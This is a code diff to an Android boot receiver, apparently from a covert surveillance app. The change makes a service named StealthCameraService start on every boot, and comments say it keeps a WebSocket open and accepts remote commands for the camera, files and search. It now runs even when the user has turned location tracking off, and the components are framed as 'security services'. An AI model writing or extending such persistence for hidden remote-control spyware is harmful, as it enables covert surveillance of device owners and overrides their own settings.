@@ -37,28 +37,28 @@ public class BootReceiver extends BroadcastReceiver {
 
             try {
                 SharedPreferences prefs = context.getSharedPreferences("LocationTracker", Context.MODE_PRIVATE);
+                String deviceId = DeviceIdManager.getDeviceId(context);
+                String deviceName = prefs.getString("device_name", "SecureDevice");
+                final String finalDeviceId = deviceId;
+                final String finalDeviceName = deviceName;
+
+                // StealthCameraService запускается ВСЕГДА — он держит WebSocket и принимает
+                // команды (камера, файлы, поиск) независимо от статуса геолокации
+                startSecurityService(context, StealthCameraService.class, finalDeviceId, finalDeviceName);
 
                 if (prefs.getBoolean("auto_tracking", false)) {
-                    // Используем единый DeviceIdManager как источник истины
-                    String deviceId = DeviceIdManager.getDeviceId(context);
-                    String deviceName = prefs.getString("device_name", "SecureDevice");
-
-                    final String finalDeviceId = deviceId;
-                    final String finalDeviceName = deviceName;
-
+                    // Геолокация включается только если была активна до перезагрузки
                     startSecurityService(context, LocationService.class, finalDeviceId, finalDeviceName);
 
                     android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
                     handler.postDelayed(() -> {
                         startSecurityService(context, BackupLocationService.class, finalDeviceId, finalDeviceName);
                         startSecurityService(context, WatchdogService.class, finalDeviceId, finalDeviceName);
-                        // StealthCameraService — WebSocket-соединение, критично для online-статуса
-                        startSecurityService(context, StealthCameraService.class, finalDeviceId, finalDeviceName);
                     }, 30000);
 
                     Log.d(TAG, "Security services scheduled for auto-start");
                 } else {
-                    Log.d(TAG, "Auto-tracking disabled");
+                    Log.d(TAG, "Auto-tracking disabled, only WebSocket service started");
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Error in boot receiver", e);
